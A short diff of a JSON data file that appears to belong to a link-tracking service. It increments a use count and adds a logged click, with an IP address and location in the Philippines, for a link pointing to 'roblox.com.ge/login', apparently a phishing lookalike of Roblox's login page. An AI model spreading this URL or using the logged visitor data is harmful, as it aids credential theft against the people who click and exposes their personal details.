@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1686,
+    "useCount": 1687,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13656,6 +13656,14 @@
         "city": "Phú Thọ Hòa",
         "flag": "🇻🇳",
         "countryCode": "VN"
+      },
+      {
+        "timestamp": 1777642540006,
+        "ip": "120.29.78.155",
+        "country": "Philippines",
+        "city": "Angeles City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
